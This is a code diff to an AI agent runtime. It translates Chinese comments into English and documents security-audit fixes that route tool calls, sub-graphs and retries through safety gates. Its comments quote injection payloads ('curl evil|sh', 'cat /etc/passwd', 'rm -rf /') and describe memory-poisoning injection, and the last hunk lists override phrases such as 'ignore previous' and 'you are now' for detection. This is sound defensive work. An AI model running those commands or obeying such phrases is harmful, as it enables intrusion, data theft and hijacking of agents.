@@ -385,7 +385,8 @@ class _NodeExecutorsMixin:
             yield AgentEvent(type=AgentEventType.ERROR, content=block_reason)
             return
 
-        # C13: llm.call span — 跨流/非流路径, end 时带 prompt/completion_tokens.
+        # C13: llm.call span — covers both streaming/non-streaming paths,
+        # carries prompt/completion_tokens at end.
         llm_span = None
         if self.telemetry_engine is not None:
             try:
@@ -419,9 +420,10 @@ class _NodeExecutorsMixin:
                     delta_tool_calls = chunk.get("delta_tool_calls")
                     finish_reason = chunk.get("finish_reason")
 
-                    # 网关以 error chunk 报错 (无可用 client/流超时等), 曾被静默
-                    # 丢弃 — SSE 只见 think""/done, 无任何 ERROR 事件. 显式抛出,
-                    # 走统一 except 路径让客户端看到失败原因.
+                    # Gateway reports errors as an error chunk (no usable client/stream
+                    # timeout etc.) and this used to be silently dropped — SSE only saw
+                    # think""/done with no ERROR event. Raise explicitly so the unified
+                    # except path shows the client the failure reason.
                     if chunk.get("error"):
                         raise RuntimeError(f"chat_stream error: {chunk['error']}")
 
@@ -540,7 +542,7 @@ class _NodeExecutorsMixin:
             yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
             return
 
-        # C13: end llm.call span — 计数+延迟+token 用量入属性.
+        # C13: end llm.call span — counter+latency+token usage recorded as attributes.
         if llm_span is not None and self.telemetry_engine is not None:
             try:
                 if isinstance(usage, dict):
@@ -683,10 +685,12 @@ class _NodeExecutorsMixin:
 
             tool_errors: list[str] = []
 
-            # C1 parallel_tool_calls: 预解析 + 控制流工具检测。
-            # 并行仅当 parallel_tool_calls=True 且 plan_mode 关 (敏感门禁需顺序)
-            # 且无控制流工具 (__sub_graph__/register_tool/unregister_tool/exit_plan_mode)。
-            # 混合或门禁态 -> 回退现有顺序循环 (向后兼容, 零风险)。
+            # C1 parallel_tool_calls: pre-parse + control-flow tool detection.
+            # Parallel only when parallel_tool_calls=True and plan_mode is off
+            # (sensitive gates need ordering) and no control-flow tools are present
+            # (__sub_graph__/register_tool/unregister_tool/exit_plan_mode).
+            # Mixed or gated -> fall back to the existing sequential loop (backward
+            # compatible, zero risk).
             _control_flow_tools = {
                 "__sub_graph__",
                 "register_tool",
@@ -710,7 +714,8 @@ class _NodeExecutorsMixin:
                     parsed_calls.append((fn, fa, tc.get("id", "")))
 
             if can_parallel and parsed_calls:
-                # 并行路径: 先发所有 TOOL_CALL, gather 执行, 按输入序发 TOOL_RESULT。
+                # Parallel path: emit all TOOL_CALLs first, execute via gather, emit
+                # TOOL_RESULTs in input order.
                 for fn, fa, _tcid in parsed_calls:
                     # #4: durable session event log — tool_call before the
                     # parallel fan-out; result pairing by call_id.
@@ -792,10 +797,11 @@ class _NodeExecutorsMixin:
                         continue
 
                     if func_name == "register_tool":
-                        # 审计 P1-3: register_tool 是写操作 (注册动态工具, 其 execute
-                        # 可 exec subprocess). N0 ToolFunnel 收编注册级 gate
-                        # (hooks -> permission deny-first -> safety). 动态工具
-                        # _dyn_execute 已补执行级 L3, 此处是注册级防御纵深.
+                        # Audit P1-3: register_tool is a write operation (registers a
+                        # dynamic tool whose execute can exec subprocesses). N0 ToolFunnel
+                        # brings in the registration-level gate (hooks -> permission
+                        # deny-first -> safety). Dynamic tool _dyn_execute already covers
+                        # execution-level L3; this is registration-level defense in depth.
                         funnel_outcome = await self.tool_funnel.admit(
                             ctx=ctx,
                             tool_name="register_tool",
@@ -833,8 +839,9 @@ class _NodeExecutorsMixin:
                         continue
 
                     if func_name == "unregister_tool":
-                        # 审计 P1-3: unregister_tool 同 register_tool, N0 ToolFunnel
-                        # 收编注册级 gate (hooks -> permission deny-first -> safety).
+                        # Audit P1-3: unregister_tool same as register_tool, N0 ToolFunnel
+                        # brings in the registration-level gate (hooks -> permission
+                        # deny-first -> safety).
                         funnel_outcome = await self.tool_funnel.admit(
                             ctx=ctx,
                             tool_name="unregister_tool",
@@ -1012,8 +1019,8 @@ class _NodeExecutorsMixin:
                             node.label,
                         )
 
-                    # C13: tool.call span — 计数+延迟. 在 try 之前初始化,
-                    # KeyError(tool 不存在)在 start_span 之前抛出时 except 仍安全.
+                    # C13: tool.call span — counter+latency. Initialized before the try so
+                    # the except stays safe when KeyError (tool missing) raises before start_span.
                     tool_span = None
                     try:
                         tool = self.tools.get(func_name)
@@ -1102,11 +1109,12 @@ class _NodeExecutorsMixin:
                     if str(result).startswith("Error:"):
                         tool_errors.append(f"{func_name}: {result}")
 
-            # 审计 L-2: LLM function-call 路径 stop_on_tool_error. 直接 tool
-            # 节点路径 (2082) 在工具出错且 graph.stop_on_tool_error=True 时
-            # set ctx.error + 发 ERROR + return 停级联; 但本 LLM 路径只把
-            # 错误塞进 tool_errors 然后继续走 retry_on_error, 从不尊重
-            # stop_on_tool_error — 节点级开关在 LLM 驱动路径静默失效.
+            # Audit L-2: stop_on_tool_error on the LLM function-call path. The direct tool
+            # node path (2082) sets ctx.error + emits ERROR + returns to stop the cascade
+            # when a tool errors and graph.stop_on_tool_error=True; but this LLM path only
+            # stuffed the error into tool_errors and kept going through retry_on_error,
+            # never honoring stop_on_tool_error — the node-level switch silently no-oped
+            # on the LLM-driven path.
             if tool_errors and getattr(graph, "stop_on_tool_error", False):
                 ctx.error = f"Tool errors in LLM node '{node.label}': " + "; ".join(tool_errors)
                 logger.warning(
@@ -1145,10 +1153,11 @@ class _NodeExecutorsMixin:
                     )
                     ctx.add_message("system", retry_prompt)
 
-                    # 审计 D-4: self-repair 路径的 LLM 调用原本完全脱离
-                    # safety_gateway — 主 LLM 节点路径 (1055) 过
-                    # category=llm_call, 自愈重试却裸调 gateway, L3 内容
-                    # 检查在此静默失效. 补 gate, 与主路径一致.
+                    # Audit D-4: the self-repair path's LLM call originally bypassed
+                    # safety_gateway entirely — the main LLM node path (1055) goes through
+                    # category=llm_call, but the self-heal retry called the gateway bare and
+                    # L3 content checks silently no-oped here. Add the gate, matching the
+                    # main path.
                     if self.safety_gateway:
                         safety_result = self.safety_gateway.evaluate_action(
                             category="llm_call",
@@ -1182,7 +1191,7 @@ class _NodeExecutorsMixin:
                             if evt.type == AgentEventType.ERROR:
                                 return
 
-                    # 审计 P-2: self-repair retry is a separate LLM call and
+                    # Audit P-2: self-repair retry is a separate LLM call and
                     # must pass the same LLMFunnel (budget -> hooks ->
                     # compaction), not dial the gateway raw.
                     retry_messages = messages + ctx.messages[-_MAX_RETRY_CONTEXT_MESSAGES:]
@@ -1256,11 +1265,11 @@ class _NodeExecutorsMixin:
                             args=fa,
                             node_id=node.label,
                         )
-                        # 审计 D-4: self-repair 重试的工具执行原本完全绕过
-                        # plan_mode 门禁与 safety_gateway L3 — 主 LLM 路径
-                        # 的 plan_mode 块 (1350) 与 D-2 的 tool_call gate 在
-                        # 此都不生效. 补齐: plan_mode 只读期挡写工具, L3
-                        # 内容检查走 tool_call category.
+                        # Audit D-4: the self-repair retry's tool execution originally bypassed
+                        # plan_mode gating and safety_gateway L3 — the main LLM path's plan_mode
+                        # block (1350) and D-2's tool_call gate never applied here. Fill the gap:
+                        # block write tools during plan_mode read-only, and route L3 content
+                        # checks through the tool_call category.
                         if (
                             ctx.plan_mode
                             and fn != "exit_plan_mode"
@@ -1285,9 +1294,10 @@ class _NodeExecutorsMixin:
                             )
                             tool_errors.append(f"{fn}: {r}")
                             continue
-                        # #475: self-repair retry走 ToolFunnel 统一准入链
-                        # (hooks -> permission deny-first -> safety -> budget),
-                        # 与主 LLM 路径同构, 不再内联 evaluate_action.
+                        # #475: self-repair retry goes through the ToolFunnel unified
+                        # admission chain (hooks -> permission deny-first -> safety ->
+                        # budget), isomorphic with the main LLM path; no longer inlines
+                        # evaluate_action.
                         funnel_outcome = await self.tool_funnel.admit(
                             ctx=ctx,
                             tool_name=fn,
@@ -1440,18 +1450,21 @@ class _NodeExecutorsMixin:
     async def _exec_parallel_tool(
         self, ctx: AgentContext, node: NodeConfig, func_name: str, func_args: dict
     ) -> tuple[str, bool]:
-        # C1 并行工具执行: 验参 + 配置默认 + execute, 返回 (result_str, is_error)。
-        # 审计 E-3/P0-3: 旧并行路径跳过 PRE_TOOL_USE hook + SafetyGateway L3 内容
-        # 检查 — parallel_tool_calls=True 可绕过 shell/网络/写入门, RCE 向量.
-        # 现在此处与顺序路径 (llm_func_call 1434-1497) 对齐:
-        #   1. PRE_TOOL_USE hook — block 决策直接返回 blocked 结果
-        #   2. SafetyGateway evaluate_action(category=tool_call) — 内容匹配危险
-        #      模式 (rm -rf / / DROP TABLE) -> block; L2/L3 需审批 -> fail-closed
-        #      (并行无法 yield 审批流), 返回 error 促使 LLM 回退顺序审批路径.
+        # C1 parallel tool execution: arg validation + config defaults + execute,
+        # returns (result_str, is_error).
+        # Audit E-3/P0-3: the old parallel path skipped the PRE_TOOL_USE hook and
+        # SafetyGateway L3 content checks — parallel_tool_calls=True could bypass the
+        # shell/network/write gates, an RCE vector. Now aligned with the sequential path
+        # (llm_func_call 1434-1497):
+        #   1. PRE_TOOL_USE hook — a block decision returns the blocked result directly
+        #   2. SafetyGateway evaluate_action(category=tool_call) — content matching
+        #      dangerous patterns (rm -rf / / DROP TABLE) -> block; L2/L3 needing
+        #      approval -> fail-closed (parallel cannot yield the approval flow),
+        #      returning error so the LLM falls back to the sequential approval path.
         # N0 ToolFunnel: parallel admission goes through the same funnel chain
         # (hooks -> permission -> safety). Parallel cannot pause for approval,
         # so needs_approval degrades to a sequential-retry error (unchanged).
-        # 审计 P-1: parallel admission MUST carry the real node ctx. Passing
+        # Audit P-1: parallel admission MUST carry the real node ctx. Passing
         # ctx=None silently disabled the plan gate (ctx.plan_mode) and every
         # role-scoped rule (ctx.role) on this path.
         funnel_outcome = await self.tool_funnel.admit(
@@ -1566,14 +1579,16 @@ class _NodeExecutorsMixin:
                 yield event
             return
 
-        # 防御: 直接调用 (测试/error_handler 委托) ctx.variables 未被 dispatch 播种.
+        # Defense: direct calls (tests/error_handler delegation) may not have ctx.variables seeded.
         self._seed_ctx_variables(ctx)
         params = {}
-        # 审计 E-4/P0-4: 插值 → 终端命令注入. `{{user_input}}` 直连 terminal
-        # `command` 时, 攻击者控制的图输入成 shell 命令 (curl evil|sh / cat
-        # /etc/passwd / scp 私钥), 绕灾难黑名单. 此处 fail-closed: terminal
-        # command 含变量插值一律挡, 需 FUSION_TERMINAL_ALLOW_INTERP=1 显式 opt-in
-        # (受控 CI). 转义 (shlex.quote) 仍漏多命令语义注入, 故硬挡更安全.
+        # Audit E-4/P0-4: interpolation -> terminal command injection. With `{{user_input}}`
+        # wired straight into terminal `command`, attacker-controlled graph input becomes a
+        # shell command (curl evil|sh / cat /etc/passwd / scp private keys), bypassing the
+        # catastrophic blacklist. Fail-closed here: terminal commands containing variable
+        # interpolation are always blocked; explicit opt-in via FUSION_TERMINAL_ALLOW_INTERP=1
+        # (controlled CI). Escaping (shlex.quote) still misses multi-command semantic
+        # injection, so a hard block is safer.
         if node.tool_name == "terminal":
             _allow_interp = os.environ.get("FUSION_TERMINAL_ALLOW_INTERP", "").strip().lower() in (
                 "1",
@@ -1816,11 +1831,13 @@ class _NodeExecutorsMixin:
     def _apply_tool_output_mapping(
         self, output_mapping: dict, result: Any, node_label: str, ctx: AgentContext
     ) -> None:
-        """把工具返回值按 output_mapping 写入变量，供下游节点 {{ var }} 引用。
+        """Write the tool return value into variables per output_mapping, for downstream
+        nodes' {{ var }} references.
 
-        约定 {source_key: target_var}，与 sub_graph output_mapping 一致：
-        - source_key 为 "" 或 "result"：整值写入 target_var
-        - 否则：尝试 json.loads(result) 按 source_key 取值；解析失败回退整值并记 warning
+        Convention {source_key: target_var}, consistent with sub_graph output_mapping:
+        - source_key "" or "result": write the whole value into target_var
+        - otherwise: try json.loads(result) and take source_key; on parse failure fall
+          back to the whole value and log a warning
         """
         parsed = None
         for source_key, target_var in output_mapping.items():
@@ -1834,7 +1851,7 @@ class _NodeExecutorsMixin:
                     parsed = json.loads(result)
                 except (ValueError, TypeError):
                     logger.warning(
-                        "output_mapping: node=%s result 非 JSON，回退整值写入 %s",
+                        "output_mapping: node=%s result not JSON, fallback to whole value into %s",
                         node_label,
                         target_var,
                     )
@@ -1946,7 +1963,7 @@ class _NodeExecutorsMixin:
         self, ctx: AgentContext, node: NodeConfig, graph: AgentGraph
     ) -> AgentEvent:
         """Execute a loop node — check if loop should continue."""
-        # 防御: 直接调用 (测试/并行分支) ctx.variables 未被 dispatch 播种.
+        # Defense: direct calls (tests/parallel branches) may not have ctx.variables seeded.
         self._seed_ctx_variables(ctx)
         max_iter = node.max_iterations
         loop_var = node.tool_params.get("loop_var", "loop_count")
@@ -2389,8 +2406,9 @@ class _NodeExecutorsMixin:
                     ):
                         yield event
                 elif failed_node.type == "rag":
-                    # 审计 P1-16: 原 error_handler 仅重试 tool/llm, rag/planner/verify
-                    # 失败后 error_handler 无路径重试 -> 直接放弃. 补齐这三种.
+                    # Audit P1-16: the original error_handler only retried tool/llm; after a
+                    # rag/planner/verify failure there was no retry path -> gave up directly.
+                    # Add those three.
                     model = graph.find_llm_model()
                     tools_schema = self.tools.to_openai_schemas(role=getattr(ctx, "role", "all"))
                     async for event in self._execute_rag_node(
@@ -2437,9 +2455,10 @@ class _NodeExecutorsMixin:
         current_node_id: str,
         stream: bool = False,
     ) -> AsyncIterator[AgentEvent]:
-        # C5: parallel 图节点真 fan-out/gather。所有出边 = N 条并行分支,
-        # 每分支独立 sub-runtime 跑从分支 target 起到汇聚点的子图,
-        # asyncio.gather 并发, 结果按边序合并进父 ctx。
+        # C5: true fan-out/gather for parallel graph nodes. All outgoing edges = N parallel
+        # branches; each branch runs an independent sub-runtime over the sub-graph from its
+        # branch target to the merge point, concurrent via asyncio.gather, results merged
+        # into the parent ctx in edge order.
         yield AgentEvent(
             type=AgentEventType.START,
             content=f"Parallel fan-out from {current_node_id}",
@@ -2457,7 +2476,7 @@ class _NodeExecutorsMixin:
             )
             return
 
-        # plan_mode 激活: 只读探查, 不 fan-out 写副作用, 回退首边。
+        # plan_mode active: read-only exploration, no fan-out writes, fall back to the first edge.
         if ctx.plan_mode:
             first_target = outgoing[0].target_id
             logger.info(
@@ -2473,7 +2492,7 @@ class _NodeExecutorsMixin:
             )
             return
 
-        # 单出边: 无 fan-out 必要, 直接走首边 (零行为变化)。
+        # Single outgoing edge: no fan-out needed; take the first edge (zero behavior change).
         if len(outgoing) == 1:
             only_target = outgoing[0].target_id
             yield AgentEvent(
@@ -2484,9 +2503,10 @@ class _NodeExecutorsMixin:
             )
             return
 
-        # 找汇聚点 (fan-in target): 各分支 target 出发的可达节点集合的交集中,
-        # 距离 parallel 节点最近的公共后继。若全分支共享同一后继即汇聚点;
-        # 找不到则各分支跑到各自 end, 无显式汇聚。
+        # Find the merge point (fan-in target): among the intersection of the reachable
+        # node sets from each branch target, the common successor closest to the parallel
+        # node. If all branches share one successor that is the merge point; if none is
+        # found, each branch runs to its own end with no explicit merge.
         merge_node_id = self._find_merge_node(graph, outgoing)
         logger.info(
             "parallel node %s branches=%d merge=%s",
@@ -2500,7 +2520,7 @@ class _NodeExecutorsMixin:
         async def run_branch(
             branch_idx: int, branch_target: str, edge_label: str
         ) -> tuple[int, str, list[AgentEvent], str]:
-            # 构建分支子图: 从 branch_target 可达且不含 merge_node 的节点。
+            # Build the branch sub-graph: nodes reachable from branch_target, excluding merge_node.
             sub_graph = self._build_branch_subgraph(
                 graph, branch_target, merge_node_id, current_node_id
             )
@@ -2523,31 +2543,35 @@ class _NodeExecutorsMixin:
                 store=self.store,
                 memory_engine=self.memory_engine,
                 telemetry_engine=self.telemetry_engine,
-                # 审计 P1-17: 并行子 runtime 原不传 artifact_manager, 分支内
-                # artifact 感知上下文/compaction 触发全失效 (父有子无).
+                # Audit P1-17: parallel sub-runtimes originally got no artifact_manager, so
+                # artifact-aware context/compaction triggers all failed inside branches
+                # (parent had it, child did not).
                 artifact_manager=self.artifact_manager,
             )
-            # 审计 D-3: sub-runtime 继承父 runtime 的 plan_mode, 否则
-            # 父处于只读探索期时并行分支仍可调写工具绕过门禁.
-            # 审计 A-1 Tier2: plan_mode per-exec, 经 sub_ctx 传入, 子 runtime
-            # dispatch (context 提供) 继承, 不再写 sub_runtime 单例.
+            # Audit D-3: the sub-runtime inherits the parent runtime's plan_mode; otherwise
+            # while the parent is in read-only exploration parallel branches can still call
+            # write tools and bypass the gate.
+            # Audit A-1 Tier2: plan_mode is per-exec, passed via sub_ctx; the sub-runtime
+            # dispatch (context provided) inherits it instead of writing the sub_runtime
+            # singleton.
             sub_ctx = AgentContext()
             sub_ctx.plan_mode = ctx.plan_mode
-            # 审计 P1-6: sub_ctx 继承父 session_id/agent_id, 否则分支内
-            # trajectory/checkpoint/memory 全挂在不存在的 session 上, 父无法关联.
+            # Audit P1-6: sub_ctx inherits the parent session_id/agent_id; otherwise branch
+            # trajectory/checkpoint/memory all attach to a nonexistent session and the parent
+            # cannot correlate them.
             sub_ctx.session_id = ctx.session_id
             sub_ctx.agent_id = ctx.agent_id
             sub_ctx.metadata["parallel_branch"] = edge_label or f"branch_{branch_idx}"
-            # 审计 P0-3: 并行子 runtime 继承父默认预算 (父 _default_token_budget).
+            # Audit P0-3: parallel sub-runtimes inherit the parent's default token budget.
             sub_runtime._default_token_budget = self._default_token_budget
-            # 审计 P1-7: 并行子 runtime 继承父深度 +1 (与 sub-graph 一致),
-            # 递归并行深度计数贯穿, 防 fan-out 嵌套无界.
+            # Audit P1-7: parallel sub-runtimes inherit parent depth +1 (same as sub-graph),
+            # keeping the recursive parallel depth count continuous to bound fan-out nesting.
             sub_runtime._sub_graph_depth = self._sub_graph_depth + 1
             branch_events: list[AgentEvent] = []
             async for event in sub_runtime.execute_graph(sub_graph, "", sub_ctx):
                 branch_events.append(event)
 
-            # 提取分支最终输出 (最后一条 assistant content 或 THINK 事件)。
+            # Extract the branch's final output (last assistant content or THINK event).
             branch_output = ""
             for ev in reversed(branch_events):
                 if ev.type == AgentEventType.THINK and ev.content:
@@ -2567,8 +2591,9 @@ class _NodeExecutorsMixin:
             )
             return branch_idx, edge_label, branch_events, branch_output
 
-        # 审计 P3-3: 宽 fan-out 节流. FUSION_PARALLEL_BRANCH_CONCURRENCY=N 时用
-        # 信号量限并发分支数 (默认 0 不限, 由 P2-15 branch cap + P1-4 LLM 信号量兜底).
+        # Audit P3-3: throttle wide fan-out. When FUSION_PARALLEL_BRANCH_CONCURRENCY=N, use
+        # a semaphore to cap concurrent branches (default 0 = unlimited; bounded by the
+        # P2-15 branch cap and P1-4 LLM semaphore as backstops).
         branch_limit = _parallel_branch_concurrency()
         branch_sem = asyncio.Semaphore(branch_limit) if branch_limit > 0 else None
 
@@ -2582,12 +2607,13 @@ class _NodeExecutorsMixin:
             _throttled_branch(i, tgt, e.label)
             for i, (e, tgt) in enumerate(zip(outgoing, branch_targets))
         ]
-        # 审计 P1-8/A-5: return_exceptions=True 防单分支异常 abort 整个并行节点
-        # (原 gather 默认 raise 致其余分支结果全丢). 合并循环按序处理异常分支,
-        # 异常分支降级为 Error 输出, 不 abort 其余正常分支.
+        # Audit P1-8/A-5: return_exceptions=True prevents one branch's exception from
+        # aborting the whole parallel node (the original gather re-raised by default and
+        # lost all other branches' results). The merge loop processes failed branches in
+        # order, degrades them to Error output, and never aborts healthy branches.
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
-        # 按边序 yield 各分支事件 (带 [parallel:label] 标签)。
+        # Yield branch events in edge order (tagged with [parallel:label]).
         merged_outputs: list[str] = []
         for r in sorted(results, key=lambda x: x[0] if isinstance(x, tuple) else 0):
             if isinstance(r, BaseException):
@@ -2610,7 +2636,7 @@ class _NodeExecutorsMixin:
             if branch_output:
                 merged_outputs.append(f"[{tag}]\n{branch_output}")
 
-        # 合并: 各分支输出拼接进父 ctx 作为 assistant message。
+        # Merge: concatenate branch outputs into the parent ctx as an assistant message.
         if merged_outputs:
             merged_text = "\n\n".join(merged_outputs)
             ctx.add_message("assistant", merged_text)
@@ -2629,13 +2655,14 @@ class _NodeExecutorsMixin:
         )
 
     def _find_merge_node(self, graph: AgentGraph, outgoing: list) -> str:
-        # 找 fan-in 汇聚点: 各分支 target 可达集合 (不含自身) 的公共节点中,
-        # 选所有分支都可达的那个。多候选时取分支0 可达序中首个公共点。
+        # Find the fan-in merge point: among nodes common to every branch target's reachable
+        # set (excluding itself), pick one reachable from all branches. With multiple
+        # candidates, take the first common node in branch 0's reachability order.
         if len(outgoing) < 2:
             return ""
 
         def reachable_from(start_id: str) -> tuple[set[str], list[str]]:
-            # 返回 (可达集合, BFS 发现序列表) — 列表保证确定性遍历。
+            # Returns (reachable set, BFS discovery order) — the list keeps traversal deterministic.
             visited: set[str] = set()
             order: list[str] = []
             queue = [start_id]
@@ -2651,15 +2678,15 @@ class _NodeExecutorsMixin:
 
         branch_targets = [e.target_id for e in outgoing]
         reachable_sets = [reachable_from(t)[0] for t in branch_targets]
-        # 公共可达 = 所有分支都能到达的节点。
+        # Common reachable = nodes every branch can reach.
         common = reachable_sets[0]
         for s in reachable_sets[1:]:
             common = common & s
-        # 排除分支 target 自身 (汇聚点应在分支之后)。
+        # Exclude the branch target itself (the merge point should come after the branches).
         common = common - set(branch_targets)
         if not common:
             return ""
-        # 取分支0 BFS 发现序中首个公共节点 (最近汇聚点, 确定性)。
+        # Take branch 0's first common BFS-discovered node (nearest merge point, deterministic).
         _, order = reachable_from(branch_targets[0])
         for nid in order:
             if nid in common:
@@ -2673,15 +2700,15 @@ class _NodeExecutorsMixin:
         merge_node_id: str,
         parallel_node_id: str,
     ) -> AgentGraph | None:
-        # 构建分支子图: 从 branch_target 起可达、不含 merge_node / parallel_node
-        # 的节点子集; start_node_id = branch_target; end 节点复用 graph 的 end
-        # (若无 merge_node 则分支跑到原 end)。
+        # Build the branch sub-graph: the node subset reachable from branch_target that
+        # excludes merge_node / parallel_node; start_node_id = branch_target; the end node
+        # reuses the graph's end (without a merge_node, branches run to the original end).
         if branch_target not in graph.nodes:
             return None
 
         excluded = {merge_node_id, parallel_node_id} if merge_node_id else {parallel_node_id}
 
-        # BFS 收集分支可达节点 (遇 merge_node 不越过)。
+        # BFS-collect branch-reachable nodes (stop at merge_node, do not cross).
         branch_nodes: set[str] = set()
         queue = [branch_target]
         while queue:
@@ -2700,10 +2727,10 @@ class _NodeExecutorsMixin:
             name=f"{graph.name}:branch:{branch_target}",
             start_node_id=branch_target,
         )
-        # 复制分支节点; 分支起点若原为 start 类型则保持, 否则不改类型。
+        # Copy branch nodes; keep a start-type branch entry as start, otherwise leave types alone.
         for nid in branch_nodes:
             sub.add_node(nid, graph.nodes[nid])
-        # 复制分支内的边 (源+目标都在分支节点集, 且不指向 merge_node)。
+        # Copy edges within the branch (source+target both in the branch set, not merge_node).
         for e in graph.edges:
             if e.source_id in branch_nodes and e.target_id in branch_nodes:
                 sub.add_edge(e.source_id, e.target_id, e.label)
@@ -2720,7 +2747,7 @@ class _NodeExecutorsMixin:
         input_mapping = params.get("input_mapping", {})
         output_mapping = params.get("output_mapping", {})
 
-        # 审计 E-16/P0-4: 递归深度门. 超上限挡 (子图循环引用致栈溢出崩溃进程).
+        # Audit E-16/P0-4: recursion depth gate — block over the limit (cycles crash the process).
         max_depth = _max_sub_graph_depth()
         if self._sub_graph_depth >= max_depth:
             logger.warning(
@@ -2751,10 +2778,11 @@ class _NodeExecutorsMixin:
             yield AgentEvent(type=AgentEventType.ERROR, content=f"Sub-graph parse error: {e}")
             return
 
-        # 审计 A-2/A-1 Tier3: 父变量读自 ctx.variables (per-exec 父空间),
-        # 不碰 singleton self.variables. input_mapping 解析 → sub_input/sub_vars.
-        # 防御: 直接调用 _execute_sub_graph (测试/并行分支) ctx.variables 可能
-        # 未被 dispatch 播种 — 就地补 seed, 与 dispatch 同源.
+        # Audit A-2/A-1 Tier3: parent variables read from ctx.variables (per-exec parent
+        # space), never touching singleton self.variables. input_mapping resolves to
+        # sub_input/sub_vars.
+        # Defense: direct _execute_sub_graph calls (tests/parallel branches) may have
+        # unseeded ctx.variables — seed in place, same source as dispatch.
         self._seed_ctx_variables(ctx)
         sub_input = ""
         for parent_var, sub_var in input_mapping.items():
@@ -2778,25 +2806,28 @@ class _NodeExecutorsMixin:
             store=self.store,
             memory_engine=self.memory_engine,
             telemetry_engine=self.telemetry_engine,
-            # 审计 P1-17: 子图 runtime 同并行分支, 传 artifact_manager 保持
-            # artifact 感知上下文一致 (父有子无致 compaction 触发漏判).
+            # Audit P1-17: sub-graph runtimes match parallel branches — pass artifact_manager
+            # to keep artifact-aware context consistent (parent-only coverage missed
+            # compaction triggers).
             artifact_manager=self.artifact_manager,
         )
-        # 审计 D-3: sub-runtime 继承父 runtime 的 safety_gateway / store /
-        # memory_engine / plan_mode, 否则子图执行完全脱离安全网 (无 L3
-        # 内容检查 + 无只读探索门禁 + 无持久化/记忆), 父图授权的安全策略
-        # 在子图里静默失效.
-        # 审计 D-3: plan_mode 经 sub_ctx 继承 (per-exec), 不写 sub_runtime 单例.
-        # 审计 A-1 Tier2: dispatch (context 提供) 继承 ctx.plan_mode.
+        # Audit D-3: the sub-runtime inherits the parent runtime's safety_gateway / store /
+        # memory_engine / plan_mode; otherwise sub-graph execution runs with no safety net
+        # (no L3 content checks + no read-only exploration gate + no persistence/memory)
+        # and the parent graph's authorized safety policy silently lapses in the sub-graph.
+        # Audit D-3: plan_mode inherited via sub_ctx (per-exec), not written to the
+        # sub_runtime singleton.
+        # Audit A-1 Tier2: dispatch (context provided) inherits ctx.plan_mode.
         sub_ctx = AgentContext()
         sub_ctx.plan_mode = ctx.plan_mode
-        # 审计 P1-6: sub_ctx 继承父 session_id/agent_id, 子图执行关联同一会话
-        # (trajectory/task/checkpoint 链路不断裂), 与并行分支同处理.
+        # Audit P1-6: sub_ctx inherits the parent session_id/agent_id so sub-graph execution
+        # stays on the same session (trajectory/task/checkpoint chain unbroken), matching
+        # the parallel-branch handling.
         sub_ctx.session_id = ctx.session_id
         sub_ctx.agent_id = ctx.agent_id
-        # 审计 E-16: 子 runtime 继承父深度 +1, 递归计数贯穿整条子图链.
+        # Audit E-16: sub-runtimes inherit parent depth +1; the count spans the sub-graph chain.
         sub_runtime._sub_graph_depth = self._sub_graph_depth + 1
-        # 审计 P0-3: 子 runtime 继承父默认预算, 跨子图链 token 限额一致.
+        # Audit P0-3: sub-runtimes inherit the parent default budget — consistent token limits.
         sub_runtime._default_token_budget = self._default_token_budget
 
         # Issue #175: lifecycle hook — sub-agent start.
@@ -3029,7 +3060,7 @@ class _NodeExecutorsMixin:
             loop = asyncio.get_running_loop()
             future: asyncio.Future[bool] = loop.create_future()
             self._plan_futures[plan.id] = future
-            # 审计 A-1 Tier1: 登记归属 exec, 异常路径 reap 兜底.
+            # Audit A-1 Tier1: register the owning exec; reap as the exception-path safety net.
             self._register_exec_future(ctx.session_id, plan.id)
             logger.info(
                 "planner node %s blocking for approval plan_id=%s timeout=%.0fs",
@@ -3154,9 +3185,11 @@ class _NodeExecutorsMixin:
         )
 
         if not result.passed and result.issues:
-            # 审计 P2-19: verify 失败须置 ctx.error, 否则下游 condition(检查 ctx.error)
-            # 不路由 error_handler, verify 失败静默跳过容错路径. 不发 ERROR (会让
-            # dispatch 直接 return 绕过 error_handler), 用 ctx.error 驱动条件路由.
+            # Audit P2-19: a verify failure must set ctx.error; otherwise downstream
+            # condition nodes (checking ctx.error) never route to error_handler and the
+            # failure silently skips the fault-tolerance path. Do not emit ERROR (it makes
+            # dispatch return early, bypassing error_handler); drive conditional routing
+            # with ctx.error.
             ctx.error = f"Verify failed (score={result.score:.2f}): {'; '.join(result.issues)}"
             yield AgentEvent(
                 type=AgentEventType.THINK,
@@ -3336,10 +3369,12 @@ class _NodeExecutorsMixin:
         last_assistant = assistant_msgs[-1] if assistant_msgs else ""
         scope = f"graph:{graph.name}"
         content = f"Q: {last_user[:200]} A: {last_assistant[:500]}"
-        # 审计 A-2: LLM assistant 输出是不可信源, 不可归 "user" 类型 (该类型
-        # 保留给真人输入, 高优先级 recall). _auto_store_memory 含 assistant 文本,
-        # 若 classify 命中 "i am/i prefer" 归 user = 延迟注入毒化未来会话. 强制
-        # 降级: 命中 user 则改 project, 标 source="llm" 低信任, 记注入嫌疑模式.
+        # Audit A-2: LLM assistant output is an untrusted source and must not be classified
+        # as "user" (that type is reserved for human input with high-priority recall).
+        # _auto_store_memory includes assistant text; if classify matched "i am/i prefer"
+        # into user, that is delayed injection poisoning future sessions. Forced downgrade:
+        # on a user match, store as project with source="llm" (low trust) and record the
+        # suspected injection pattern.
         from .memory_engine import classify_memory_type
 
         mem_type = classify_memory_type(content)
@@ -3350,7 +3385,7 @@ class _NodeExecutorsMixin:
                 "auto-store: LLM-sourced content reclassified user->project "
                 "(user type reserved for human input, A-2 injection hardening)"
             )
-        # 简易注入嫌疑检测: assistant 文本含指令性 "ignore previous"/"system:" 等
+        # Lightweight injection suspicion detection: assistant text containing directive
         llm_injection_suspect = llm_sourced and any(
             pat in last_assistant.lower()
             for pat in ("ignore previous", "ignore all", "system:", "disregard", "you are now")
